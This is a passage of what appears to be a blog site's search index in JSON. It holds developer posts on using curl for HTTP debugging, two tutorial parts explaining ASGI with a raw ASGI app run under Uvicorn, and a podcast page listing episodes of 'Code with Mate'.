tool.</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#how-curl-fits-in-everyday-dev-life","title":"How curl Fits in Everyday Dev Life","text":"<p><code>curl</code> is not just for testing APIs. It\u2019s a daily development companion.</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#1-health-checks","title":"1. Health checks","text":"<pre><code>curl -fsSL http://localhost:8000/health || echo \"Service down\"\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#2-quick-response-code-check","title":"2. Quick response code check","text":"<pre><code>curl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8000\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#3-debugging-with-headers","title":"3. Debugging with headers","text":"<pre><code>curl -v -X GET http://localhost:8000/api/items  \ncurl -i http://localhost:8000/api/status\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#4-testing-authentication","title":"4. Testing authentication","text":"<pre><code>curl -u admin:password http://localhost:8000/api/users\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#5-sending-json-data","title":"5. Sending JSON data","text":"<pre><code>curl -X POST http://localhost:8000/api/shorten \\  \n  -H \"Content-Type: application/json\" \\  \n  -d '{\"url\": \"https://example.com\"}'\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#6-simulating-different-http-verbs","title":"6. Simulating different HTTP verbs","text":"<pre><code>curl -X PUT http://localhost:8000/api/items/1 -d '{\"name\": \"updated\"}'  \ncurl -X DELETE http://localhost:8000/api/items/1\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#7-working-inside-docker-containers","title":"7. Working inside Docker containers","text":"<pre><code>docker exec -it tinyurl-app-fastapi-1 curl http://redis:6379\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#8-testing-redirects-and-caching","title":"8. Testing redirects and caching","text":"<pre><code>curl -L http://localhost:8000/short/123  \ncurl -I http://localhost:8000/static/style.css\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#9-monitoring-endpoints-continuously","title":"9. Monitoring endpoints continuously","text":"<pre><code>watch -n 2 'curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8000/health'\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#10-downloading-and-uploading-files","title":"10. Downloading and uploading files","text":"<pre><code>curl -O https://example.com/file.zip  \ncurl -T myfile.txt ftp://ftp.example.com/ --user user:password\n</code></pre>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#the-terminal-teaches-clarity","title":"The Terminal Teaches Clarity","text":"<p>When you write requests in <code>curl</code>, you\u2019re not hiding behind tools. You\u2019re speaking to your server directly.</p> <p>Each request is a sentence. Each flag is a verb. Each header is a whisper between client and server.</p> <p><code>curl</code> slows you down just enough to see what\u2019s really happening. And once you see it, you never unsee it.</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#feel-the-protocol","title":"Feel the Protocol","text":"<p><code>curl</code> is how you think in HTTP. It\u2019s how you debug, learn, and build with precision. It\u2019s that small command you reach for when nothing else feels right.</p> <p>So the next time you open your terminal, type <code>curl</code> and listen. The protocol has been trying to talk to you all along.</p> <p>By Kfir Gisman on November 10, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/","title":"From Passive FastAPI Developer to Real FastAPI Engineer- Part 1: ASGI","text":"<p>Understanding ASGI by Breaking Down an HTTP Request </p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#from-passive-fastapi-developer-to-real-fastapi-engineer-part-1-asgi_1","title":"From Passive FastAPI Developer to Real FastAPI Engineer- Part 1: ASGI","text":"<p>Photo by Kaue Barbier: https://www.pexels.com/photo/28182842/</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#understanding-asgi-by-breaking-down-an-http-request","title":"Understanding ASGI by Breaking Down an HTTP Request","text":"<p>Modern Python web frameworks feel effortless- you write a function, return some JSON, and boom: a web app. But underneath that smooth layer lies a ton of complexity: raw bytes over TCP, state machines, protocols, concurrency, and error-prone details you never want to touch.</p> <p>ASGI exists to shield you from that pain. Let\u2019s break an HTTP request down and see how ASGI fits into the picture.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#what-is-asgi","title":"What is ASGI?","text":"<p>ASGI (Asynchronous Server Gateway Interface) is a Python specification that defines how web servers communicate with asynchronous Python applications.</p> <p>Official spec: https://asgi.readthedocs.io/en/latest/</p> <p>You can think of it as the evolution of WSGI, designed for modern async apps, HTTP/2, and WebSockets.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#why-do-we-need-asgi","title":"Why Do We Need ASGI?","text":"<p>Inside every web server, there are three conceptual layers:</p> <pre><code>Transport  -&gt;  Protocol  -&gt;  Application Logic  \nTCP/SSL        HTTP/WS        Your FastAPI code\n</code></pre> <p>The problem: If every framework had to re-implement TCP handling, HTTP parsing, connection lifecycle, etc., we\u2019d live in a world of endless duplicated code and subtle bugs.</p> <p>ASGI proposes a clean split into two Python components:</p> <ol> <li>Protocol Server (e.g., Uvicorn, Hypercorn)</li> </ol> <ul> <li>Handles raw network I/O</li> <li>Transforms bytes into structured ASGI events</li> </ul> <p>2. Application (e.g., Starlette, FastAPI, custom ASGI apps)</p> <ul> <li>Receives events like <code>http.request</code></li> <li>Returns events like <code>http.response.start</code> and <code>http.response.body</code></li> </ul> <p>This \u201cbridge\u201d is ASGI:</p> <pre><code>Protocol Server  &lt;---- ASGI ----&gt;  Application\n</code></pre>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#a-quick-timeline-of-request-interfaces","title":"A Quick Timeline of Request Interfaces","text":"<p>Year Spec Notes:</p> <p>1993 CGI Process-per-request. Ancient, slow.</p> <p>2003 WSGI (PEP 333) Standardized sync Python apps.</p> <p>2010 WSGI 1.0.1 (PEP 3333) Updated for Python 3.</p> <p>2016 ASGI Async, event-based design.</p> <p>2019 ASGI 3.0 Modern form used today.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#why-wsgi-wasnt-enough","title":"Why WSGI Wasn\u2019t Enough","text":"<p>WSGI apps are synchronous and take exactly two parameters:</p> <pre><code>def app(environ, start_response):  \n    start_response(\"200 OK\", [(\"Content-Type\", \"text/plain\")])  \n    return [b\"hello\"]\n</code></pre> <p>This works for HTTP/1.1 but fails for:</p> <ul> <li>concurrency</li> <li>streaming</li> <li>long-lived connections</li> <li>WebSockets</li> </ul> <p>WSGI can\u2019t represent async behavior or event-driven protocols.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#asgis-core-idea","title":"ASGI\u2019s Core Idea","text":"<p>An ASGI application is an async callable :</p> <pre><code>async def app(scope, receive, send):  \n    ...\n</code></pre> <ul> <li>scope \u2192 Metadata about the connection (type, path, headers, etc.)</li> <li>receive() \u2192 Wait for events from server (e.g., request body chunks)</li> <li>send() \u2192 Emit events back (response start, response body, WebSocket messages)</li> </ul> <p>This event system is the real power. It makes communication flexible and supports full-duplex protocols.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#a-minimal-asgi-app-raw","title":"A Minimal ASGI App (Raw)","text":"<pre><code>async def app(scope, receive, send):  \n    assert scope[\"type\"] == \"http\"\n\nawait send({  \n        \"type\": \"http.response.start\",  \n        \"status\": 200,  \n        \"headers\": [(b\"content-type\", b\"text/plain\")],  \n    })  \n    await send({  \n        \"type\": \"http.response.body\",  \n        \"body\": b\"Hello from raw ASGI!\",  \n    })\n</code></pre> <p>Run it with Uvicorn:</p> <pre><code>uvicorn example:app\n</code></pre>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#http-request-flow-in-wsgi-vs-asgi","title":"HTTP Request Flow in WSGI vs ASGI","text":""},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#wsgi-flow-sync","title":"WSGI Flow (Sync)","text":"<pre><code>Client  \n  |  \nHTTP Request  \n  |  \nWSGI Server parses bytes  \n  |  \n(environ, start_response)  \n  |  \nWSGI App  \n  |  \nIterables of bytes  \n  |  \nWSGI Server \u2192 HTTP Response\n</code></pre> <p>No events. No async. No real-time messaging.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#asgi-flow-event-based-async","title":"ASGI Flow (Event-Based, Async)","text":"<pre><code>Client  \n  |  \nRaw Bytes  \n  |  \nProtocol Server (Uvicorn / Daphne)  \n  |  \nASGI Event: \"http.request\", \"http.disconnect\"  \n  |  \nasync app(scope, receive, send)  \n  |  \nYour app emits events:  \n  - \"http.response.start\"  \n  - \"http.response.body\"  \n  - \"websocket.accept\"  \n  - \"websocket.send\"\n</code></pre> <p>This model is more general, flexible, and future-proof.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#why-asgi-matters","title":"Why ASGI Matters","text":""},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#1-concurrency","title":"1. Concurrency","text":"<p>Async I/O = thousands of simultaneous connections.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#2-websockets-support","title":"2. WebSockets Support","text":"<p>WSGI can\u2019t do WebSockets. ASGI makes WebSockets just another protocol supported by events.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#3-full-duplex-communication","title":"3. Full-Duplex Communication","text":"<p>Send and receive independently- essential for:</p> <ul> <li>WebSockets</li> <li>HTTP streaming</li> <li>Server-Sent Events</li> <li>Background events</li> </ul>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#4-protocol-independence","title":"4. Protocol Independence","text":"<p>ASGI officially supports:</p> <ul> <li>http</li> <li>websocket</li> <li>lifespan (startup/shutdown events)</li> </ul> <p>More protocols can be added without rewriting frameworks.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#a-tiny-diagram-asgi-in-fastapi","title":"A Tiny Diagram: ASGI in FastAPI","text":"<pre><code>      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \n      \u2502   Your FastAPI   \u2502  \n      \u2502      App         \u2502  \n      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \n               \u2502  ASGI callable  \n               \u25bc  \n        ASGI Interface  \n               \u25b2  \n               \u2502 events  \n      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \n      \u2502   Uvicorn Server \u2502  \n      \u2502 (Protocol Layer) \u2502  \n      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>You \u201cinject\u201d your application into the protocol server. The server handles all low-level details- your app just reacts to events.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#final-summary","title":"Final Summary","text":"<p>ASGI gives us:</p> <ul> <li>async concurrency</li> <li>flexible event-driven communication</li> <li>WebSocket support</li> <li>protocol independence</li> <li>clean separation of logic vs transport</li> <li>a standard interface for modern Python web servers</li> </ul> <p>It\u2019s the foundation that makes Starlette and FastAPI so fast and the reason you never have to manipulate raw HTTP bytes yourself.</p>"},{"location":"blog/old-blogs/2025-11-21_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-1--ASGI-059a588a54ae/#references","title":"References:","text":"<ul> <li>The ASGI official specification at https://asgi.readthedocs.io/en/latest/</li> <li>The WSGI standard via PEP 333 at https://peps.python.org/pep-0333/ and PEP 3333 at https://peps.python.org/pep-3333/, the historical CGI/1.1 RFC at https://www.rfc-editor.org/rfc/rfc3875</li> <li>The Uvicorn ASGI server documentation at https://www.uvicorn.org/</li> <li>The Starlette framework documentation at https://www.starlette.io/</li> <li>Tmhe HTTP/1.1 protocol definition at https://www.rfc-editor.org/rfc/rfc7230, and the WebSocket protocol spec at https://www.rfc-editor.org/rfc/rfc6455</li> </ul> <p>By Kfir Gisman on November 21, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/","title":"From Passive FastAPI Developer to Real FastAPI Engineer- Part 2","text":"<p>Your First Raw ASGI App (No Frameworks Allowed). </p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#from-passive-fastapi-developer-to-real-fastapi-engineer-part-2_1","title":"From Passive FastAPI Developer to Real FastAPI Engineer- Part 2","text":"<p>Photo by Kaue Barbier: https://www.pexels.com/photo/28182837/</p> <p>Your First Raw ASGI App (No Frameworks Allowed).</p> <p>Before FastAPI. Before Starlette. Before Uvicorn.</p> <p>There is ASGI- the low-level async contract that makes modern Python web apps possible.</p> <p>In Part 1, we learned how HTTP works at the byte level. Now in Part 2, you\u2019re going to build an ASGI app from scratch.</p> <p>No router. No response class. No <code>request.query_params</code>. Just you and the ASGI spec.</p> <p>Let\u2019s turn the black box into a glass box.</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#1-why-build-a-raw-asgi-app","title":"1. Why Build a Raw ASGI App?","text":"<p>Most FastAPI developers never touch ASGI. Most don\u2019t know what\u2019s inside a request. Most don\u2019t know what Uvicorn gives them. Most don\u2019t know what Starlette abstracts.</p> <p>This chapter fixes that.</p> <p>By the end, you will understand:</p> <ul> <li>How a web server calls your ASGI application</li> <li>What a scope is.</li> <li>How <code>receive()</code> and <code>send()</code> work.</li> <li>How a single HTTP request becomes events.</li> <li>The difference between WSGI (sync) and ASGI (async).</li> <li>What FastAPI really sits on top of.</li> </ul> <p>Once you know this layer, FastAPI becomes predictable, not magical.</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#2-asgi-in-60-seconds","title":"2. ASGI in 60 Seconds","text":"<p>ASGI = Asynchronous Server Gateway Interface The modern replacement for WSGI.</p> <p>WSGI ASGI Sync Async One call, one response Event-driven HTTP only HTTP + WebSocket + lifespan Blocking Non-blocking.</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#the-asgi-callable-signature","title":"The ASGI callable signature","text":"<pre><code>async def app(scope, receive, send):  \n    ...\n</code></pre> <p>Where:</p> <p>Parameter Meaning <code>scope</code> Immutable connection info (method, headers, path, etc.) <code>receive()</code> Async function: read events from server (request body, disconnect) <code>send()</code> Async function: send events to server (response start/body)</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#3-step-by-step-build-a-raw-asgi-app","title":"3. Step-by-Step: Build a Raw ASGI App","text":"<p>Create a file:</p> <pre><code>raw_asgi_app.py\n</code></pre> <p>Paste this:</p> <pre><code># raw_asgi_app.py\n\nasync def app(scope, receive, send):  \n    print(\"=== SCOPE RECEIVED ===\")  \n    print(scope)  \n    # Only handle HTTP requests  \n    if scope[\"type\"] != \"http\":  \n        return  \n    # Wait for request event (headers/body)  \n    event = await receive()  \n    print(\"=== REQUEST EVENT ===\")  \n    print(event)  \n    body = b\"Hello from raw ASGI!\"  \n    # Send HTTP start  \n    await send({  \n        \"type\": \"http.response.start\",  \n        \"status\": 200,  \n        \"headers\": [(b\"content-type\", b\"text/plain\")]  \n    })  \n    # Send response body  \n    await send({  \n        \"type\": \"http.response.body\",  \n        \"body\": body,  \n    })\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#4-run-the-app-with-uvicorn","title":"4. Run the App With Uvicorn","text":"<p>Even though we didn\u2019t build routing or server logic, Uvicorn can execute any ASGI app :</p> <pre><code>uvicorn raw_asgi_app:app --host 127.0.0.1 --port 8000\n</code></pre> <p>Test it:</p> <pre><code>curl \"http://127.0.0.1:8000/hello?name=kfir\"\n</code></pre> <p>Watch your terminal print:</p> <ul> <li>The scope</li> <li>The request event</li> <li>The ASGI lifecycle</li> </ul> <p>This is the moment where ASGI becomes real.</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#5-understanding-the-asgi-scope","title":"5. Understanding the ASGI Scope","text":"<p>Example (shortened):</p> <pre><code>{  \n    \"type\": \"http\",  \n    \"method\": \"GET\",  \n    \"path\": \"/hello\",  \n    \"query_string\": b\"name=kfir\",  \n    \"headers\": [  \n        (b\"host\", b\"127.0.0.1:8000\"),  \n        (b\"user-agent\", b\"curl/8.0\"),  \n        (b\"accept\", b\"*/*\")  \n    ],  \n    \"client\": (\"127.0.0.1\", 53921),  \n    \"server\": (\"127.0.0.1\", 8000)  \n}\n</code></pre> <p>This is exactly the same information Starlette uses to build a <code>Request</code> object.</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#6-understanding-receive-events","title":"6. Understanding <code>receive()</code> Events","text":"<p>For HTTP requests:</p> <pre><code>{  \n    \"type\": \"http.request\",  \n    \"body\": b\"\",  \n    \"more_body\": False  \n}\n</code></pre> <p>For clients disconnecting:</p> <pre><code>{\"type\": \"http.disconnect\"}\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#7-understanding-send-events","title":"7. Understanding <code>send()</code> Events","text":""},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#start-the-http-response","title":"Start the HTTP response:","text":"<pre><code>{  \n    \"type\": \"http.response.start\",  \n    \"status\": 200,  \n    \"headers\": [...],  \n}\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#send-body","title":"Send body:","text":"<pre><code>{  \n    \"type\": \"http.response.body\",  \n    \"body\": b\"...\",  \n}\n</code></pre> <p>If streaming:</p> <pre><code>{\"body\": chunk, \"more_body\": True}\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#8-diagram-the-asgi-lifecycle","title":"8. Diagram \u2014 The ASGI Lifecycle","text":"<pre><code>Client (curl)  \n   \u2502  \n   \u25bc  \nRaw HTTP bytes  \n   \u2502  \n   \u25bc  \nUvicorn (parsing, connection, events)  \n   \u2502  \n   \u25bc  \nASGI App (your app)  \n   \u2502        \u25b2  \n send()     \u2502 receive()  \n   \u25bc        \u2502  \nResponse events  \n   \u2502  \n   \u25bc  \nUvicorn \u2192 TCP \u2192 Client\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#9-compare-this-with-wsgi","title":"9. Compare This With WSGI","text":"<p>WSGI:</p> <pre><code>def app(environ, start_response):  \n    ...\n</code></pre> <p>ASGI:</p> <pre><code>async def app(scope, receive, send):  \n    ...\n</code></pre> <p>WSGI gives you:</p> <ul> <li>sync</li> <li>blocking</li> <li>no streaming</li> <li>no WebSockets</li> </ul> <p>ASGI gives you:</p> <ul> <li>async</li> <li>streaming</li> <li>background tasks</li> <li>WebSockets</li> <li>HTTP/2 support</li> </ul>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#10-quick-exercises","title":"10. Quick Exercises","text":""},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#1-return-json-manually","title":"1. Return JSON manually","text":"<pre><code>body = b'{\"msg\":\"hello\"}'  \nheaders = [(b\"content-type\", b\"application/json\")]\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#2-parse-query-params-manually","title":"2. Parse query params manually","text":"<pre><code>qs = scope[\"query_string\"].decode()\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#3-print-content-length","title":"3. Print content length","text":"<pre><code>for name, value in scope[\"headers\"]:  \n    if name == b\"content-length\":  \n        print(\"Content-Length:\", value.decode())\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#4-respond-in-two-chunks-streaming","title":"4. Respond in two chunks (streaming)","text":"<pre><code>await send({\"type\": \"http.response.body\", \"body\": b\"Hello \", \"more_body\": True})  \nawait send({\"type\": \"http.response.body\", \"body\": b\"Kfir!\"})\n</code></pre>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#wrapping-up-why-you-just-built-asgi-by-hand","title":"Wrapping Up: Why You Just Built ASGI by Hand","text":"<p>By writing an ASGI app without FastAPI, Starlette, or any framework, you\u2019ve crossed an important threshold: you now understand what actually happens before any modern Python web framework can do its job.</p> <p>You saw how:</p> <ul> <li>A TCP connection becomes raw HTTP bytes.</li> <li>Those bytes become an ASGI scope + events.</li> <li>Your Python code responds using send()/receive() .</li> <li>The entire request/response lifecycle is just structured events , not magic.</li> </ul> <p>This understanding is what separates a FastAPI user from a FastAPI engineer.</p> <p>Every routing decision, middleware execution, background task, and WebSocket message ultimately reduces to the exact pattern you implemented manually.</p> <p>If you can build this tiny ASGI app from scratch, you can understand, debug, and optimize any modern Python web stack- from Uvicorn workers to Starlette internals all the way up to FastAPI dependencies.</p> <p>Congratulations. You\u2019re officially \u201cunder the hood.\u201d</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#official-references-highly-recommended","title":"Official References (Highly Recommended)","text":"<p>These are the authoritative sources behind everything in this blog:</p>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#asgi","title":"ASGI","text":"<ul> <li>Official ASGI Spec https://asgi.readthedocs.io/en/latest/specs/main.html</li> </ul>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#http-request-lifecycle","title":"HTTP / Request Lifecycle","text":"<ul> <li>HTTP Semantics \u2014 RFC 9110 https://httpwg.org/specs/rfc9110.html</li> <li>HTTP/1.1 Message Syntax \u2014 RFC 9112 https://httpwg.org/specs/rfc9112.html</li> </ul>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#uvicorn","title":"Uvicorn","text":"<ul> <li>Official Uvicorn Docs https://www.uvicorn.org</li> </ul>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#starlette-asgi-toolkit","title":"Starlette (ASGI Toolkit)","text":"<ul> <li>Official Starlette Docs https://www.starlette.io</li> </ul>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#fastapi","title":"FastAPI","text":"<ul> <li>Official FastAPI Docs https://fastapi.tiangolo.com</li> </ul>"},{"location":"blog/old-blogs/2025-12-08_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-2-c02de4a20dad/#wsgi-cgi-history","title":"WSGI / CGI History","text":"<ul> <li>WSGI PEP 333 https://peps.python.org/pep-0333</li> <li>WSGI PEP 3333 https://peps.python.org/pep-3333</li> <li>Common Gateway Interface https://www.rfc-editor.org/rfc/rfc3875</li> </ul> <p>By Kfir Gisman on December 8, 2025.</p> <p>Canonical link</p>"},{"location":"podcast/","title":"Podcast","text":"<p>Welcome to Code with Mate - friendly software engineering talks with a cup of mate.  </p>"},{"location":"podcast/#subscribe-to-the-podcast","title":"Subscribe to the Podcast","text":"<p>You can subscribe to my podcast using this RSS link:</p> <pre><code>https://kfir-g.dev/podcast/feed.xml\n</code></pre> <p>If your podcast app (not include Spotify) allows adding an RSS feed manually, this is the easiest way to follow new episodes.</p> <p>Not sure how to add an RSS feed? These step-by-step guides (with screenshots) will show you exactly how:</p> <ul> <li> <p>How to manually add an RSS feed to any podcast app https://www.thepitch.show/blog/how-to-manually-add-an-rss-feed-to-your-podcast-app-on-desktop-ios-android/</p> </li> <li> <p>How to add a podcast using an RSS link (multiple apps supported) https://transistor.fm/add-podcast/</p> </li> </ul> <p>Adding the feed above is the minimum step needed to start listening. Give it a try!</p> <p></p>"},{"location":"podcast/#episodes","title":"Episodes","text":""},{"location":"podcast/#episode-5-paula-medina-mora","title":"Episode 5 - Paula Medina Mora","text":"<p>Date: 2026-02-21</p> <p>Episode 5 features Paula Medina Mora - HR Expert and Founder of MakingHR. We peel back the curtain on the hiring world to see what actually happens \u201con the other side\u201d of the desk. We talk about how to build a CV that stands out, the reality of the Spanish tech market, and how to navigate the recruitment process from the first LinkedIn message to signing the contract. An honest look at the human side of software engineering, with practical advice for developers at any level - with mate on the side.</p>"},{"location":"podcast/#episode-4-roberto-j-garcia-navarro","title":"Episode 4 - Roberto J. Garc\u00eda Navarro","text":"<p>Date: 2026-01-25</p> <p>Episode 4 features Roberto J. Garc\u00eda Navarro - Senior Backend Engineer. We talk about how a junior developer can grow into a backend architect, using Roberto\u2019s real career path as a blueprint. We dive into Python, Go, event-driven architecture, and how to make good architectural decisions in real-world systems. A practical, honest conversation about career growth, system design, and learning what actually matters - with mate on the side.</p>"},{"location":"podcast/#episode-3-dev-diary-building-tinyurl-in-production","title":"Episode 3- Dev Diary: Building TinyURL in Production","text":"<p>Date: 2025-12-21</p> <p>Episode 3 takes you behind the scenes of building TinyURL - a URL shortener deployed in a production environment. We cover the full journey from designing the FastAPI backend and PostgreSQL database to implementing Redis caching and configuring Nginx as a reverse proxy. I share the challenges of CI/CD pipelines, SSL setup, and deploying with Gunicorn, as well as the lessons learned about distributed systems, caching strategies, and scaling web services. This episode gives a hands-on view of turning code into a reliable, real-world web application.</p>"},{"location":"podcast/#episode-2-martin-torre-castro","title":"Episode 2 - Mart\u00edn Torre Castro","text":"<p>Date: 2025-12-13</p> <p>Episode 2 features Mart\u00edn Torre Castro - software architect, performance engineer, and Python Coru\u00f1a community lead. We talk about performance testing in real systems, software architecture in practice, Python communities in Spain, and lessons learned from building and scaling production systems.</p>"},{"location":"podcast/#episode-1-ssali-jonathan","title":"Episode 1 - Ssali 